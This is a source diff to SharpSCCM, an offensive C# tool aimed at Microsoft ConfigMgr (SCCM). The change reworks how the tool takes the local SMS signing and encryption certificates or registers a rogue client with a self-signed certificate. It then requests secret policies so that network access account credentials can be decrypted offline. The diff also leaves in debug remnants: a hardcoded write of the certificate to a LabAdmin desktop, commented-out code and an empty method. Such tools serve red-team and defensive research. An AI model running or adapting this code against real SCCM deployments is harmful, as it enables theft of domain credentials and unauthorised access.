@@ -3,9 +3,11 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
+using System.Runtime.ConstrainedExecution;
 using System.Security.Cryptography;
 using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography.X509Certificates;
+using System.Security.Cryptography.Xml;
 using System.Text;
 using System.Xml;
 
@@ -29,18 +31,18 @@ namespace SharpSCCM
         public static MessageCertificateX509Volatile CreateUserCertificate(string subjectName = null, bool store = false)
         {
             // Generate certificate for signing and encrypting messages
-            RSA rsaKey = RSA.Create(2048);
             if (string.IsNullOrEmpty(subjectName))
             {
-               subjectName = "ConfigMgr Client Messaging";
+                subjectName = "ConfigMgr Client Messaging";
             }
+            RSA rsaKey = RSA.Create(2048);
             CertificateRequest certRequest = new CertificateRequest($"CN={subjectName}", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
             certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
             // Any extended key usage
             certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
             X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
             certificate2.FriendlyName = $"{subjectName}";
-            X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
+            X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty), string.Empty, X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable);
             Console.WriteLine($"[+] Created \"{subjectName}\" certificate in memory for device registration and signing/encrypting subsequent messages");
             if (store)
             {
@@ -48,9 +50,11 @@ namespace SharpSCCM
                 x509Store.Open(OpenFlags.MaxAllowed);
                 x509Store.Add(exportedCert);
                 Console.WriteLine($"[+] Wrote \"{subjectName}\" certificate to {x509Store.Name} store for {x509Store.Location}");
+                File.WriteAllBytes("C:\\Users\\LabAdmin\\Desktop\\myCert.pfx", exportedCert.GetRawCertData());
             }
             MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
-            return certificate;
+            Console.WriteLine($"\n    {exportedCert.GetRawCertDataString()}\n");
+            return certificate;   
         }
 
         public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 encryptionCertificate)
@@ -82,42 +86,92 @@ namespace SharpSCCM
             x509Store.Remove(certificate.X509Certificate);
             Console.WriteLine($"[+] Deleted \"{certificate.X509Certificate.SubjectName.Name}\" certificate from {x509Store.Name} store for {x509Store.Location}");
         }
-        
-        public static MessageCertificateX509 GetMachineEncryptionCertificate()
+
+        public static void GetAvailablePackages(string managementPoint = null, string siteCode = null)
         {
-            // Get encryption certificate used by the legitimate client
+
+        }
+
+        public static MessageCertificateX509 LocalSmsEncryptionCertificate()
+        {
+            // Get encryption certificate used by the legitimate client when PKI is not in use
             MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
+            Console.WriteLine("[+] Obtained SMS Encryption Certificate from local computer certificates store");
+            return certificate;
+        }
+        public static MessageCertificateX509 LocalSmsSigningCertificate()
+        {
+            // Get signing certificate used by the legitimate client when PKI is not in use
+            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
+            Console.WriteLine("[+] Obtained SMS Signing Certificate from local computer certificates store");
             return certificate;
         }
 
-        public static async void GetSecretsFromPolicy(string managementPoint, string siteCode, string username = null, string password = null, string outputPath = null, bool cert = false)
+        public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null)
         {
-            // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
-            // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
-            // OPSEC warning: I'm not sure why, but this method does not work without temporarily storing the certificate on disk
             MessageCertificateX509 signingCertificate = null;
             MessageCertificateX509 encryptionCertificate = null;
             SmsClientId clientId = null;
-            if (cert)
+           
+            if (!string.IsNullOrEmpty(encodedCertificate) && !string.IsNullOrEmpty(providedClientId))
+            {
+                //X509Certificate certFromFile = X509Certificate2.CreateFromCertFile("C:\\Users\\LabAdmin\\Desktop\\myCert.pfx");
+                //X509Certificate2 importedCertificate = new X509Certificate2(certFromFile);
+                //importedCertificate.Import(Helpers.StringToByteArray(encodedCertificate), string.Empty, X509KeyStorageFlags.PersistKeySet | X509KeyStorageFlags.Exportable);
+
+                X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
+                store.Open(OpenFlags.ReadOnly);
+                X509Certificate2Collection certificates = store.Certificates.Find(
+                    X509FindType.FindBySubjectName, "ConfigMgr Client Messaging", false);
+
+                // Get the first certificate with a private key
+                X509Certificate2 importedCertificate = null;
+                foreach (X509Certificate2 c in certificates)
+                {
+                    if (c.HasPrivateKey)
+                    {
+                        importedCertificate = c;
+                        break;
+                    }
+                }
+
+                signingCertificate = new MessageCertificateX509Volatile(importedCertificate);
+                encryptionCertificate = signingCertificate;
+                clientId = new SmsClientId(providedClientId);
+                Console.WriteLine($"[+] Using provided certificate and SMS client ID: {providedClientId}");
+            }
+            else if (string.IsNullOrEmpty(registerClient))
             {
                 if (Helpers.IsHighIntegrity())
                 {
-                    signingCertificate = GetMachineSigningCertificate();
-                    encryptionCertificate = GetMachineEncryptionCertificate();
+                    (signingCertificate, encryptionCertificate) = (LocalSmsSigningCertificate(), LocalSmsEncryptionCertificate());
                     clientId = ClientWmi.GetSmsId();
                 }
                 else
                 {
-                    Console.WriteLine("[!] Cert option can only be used from a high integrity context");
-                    return;
+                    Console.WriteLine("[!] A new device record must be created when the user is not a local administrator");
                 }
             }
             else
             {
+                if (string.IsNullOrEmpty(managementPoint) || string.IsNullOrEmpty(siteCode))
+                {
+                    (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
+                }
                 signingCertificate = CreateUserCertificate(null, true);
                 encryptionCertificate = signingCertificate;
-                clientId = RegisterClient(signingCertificate, null, managementPoint, siteCode, "Windows", username, password);
+                string authenticationType = (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)) ? "Windows": null;
+                clientId = RegisterClient(signingCertificate, registerClient, managementPoint, siteCode, authenticationType, username, password);
             }
+            return (signingCertificate, encryptionCertificate, clientId);
+        }
+
+        public static async void GetSecretsFromPolicy(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
+        {
+            // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
+            // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
+            // OPSEC warning: I'm not sure why, but this method does not work without temporarily storing the certificate on disk
+            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptionCertificate, SmsClientId clientId) = GetCertsAndClientId(managementPoint, siteCode, encodedCertificate, providedClientId, username, password, registerClient);
             
             // Send request for policy assignments to obtain policy locations
             ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);
@@ -168,7 +222,7 @@ namespace SharpSCCM
                 }
             }
             // Delete the created certificate from the current user store
-            if (!cert)
+            if (!string.IsNullOrEmpty(registerClient))
             {
                 DeleteCertificate(signingCertificate);
             }
@@ -183,13 +237,6 @@ namespace SharpSCCM
 
             // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
             Console.WriteLine("[+] Done! Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
-        }
-
-        public static MessageCertificateX509 GetMachineSigningCertificate()
-        {
-            // Get signing certificate used by the legitimate client
-            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
-            return certificate;
         }
 
         public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string username = null, string password = null)
@@ -230,7 +277,7 @@ namespace SharpSCCM
             // Register client and wait for a confirmation with the SmsId
             Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
             SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
-            Console.WriteLine($"[+] Received unique GUID for new device: {clientId}");
+            Console.WriteLine($"[+] Received unique SMS client GUID for new device:\n\n    {clientId}\n");
             return clientId;
         }
 
@@ -303,6 +350,20 @@ namespace SharpSCCM
             Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
             ddrMessage.SendMessage(sender);
             Console.WriteLine("[+] Done!");
+        }
+
+        public static ConfigMgrContentLocationReply SendContentLocationRequest(string managementPoint, string siteCode, string packageId, int packageVersion, bool cert = false)
+        {
+            HttpSender sender = new HttpSender();
+            ConfigMgrContentLocationRequest contentLocationRequest = new ConfigMgrContentLocationRequest();
+            contentLocationRequest.Discover();
+            contentLocationRequest.Settings.HostName = managementPoint;
+            contentLocationRequest.SiteCode = siteCode;
+            contentLocationRequest.LocationRequest.Package.PackageId = packageId;
+            contentLocationRequest.LocationRequest.Package.Version = packageVersion;
+            ConfigMgrContentLocationReply contentLocationReply = contentLocationRequest.SendMessage(sender);
+            Console.WriteLine(contentLocationReply.Body);
+            return contentLocationReply;
         }
 
         public static ConfigMgrPolicyAssignmentReply SendPolicyAssignmentRequest(SmsClientId clientId, MessageCertificateX509 certificate, string managementPoint, string siteCode)
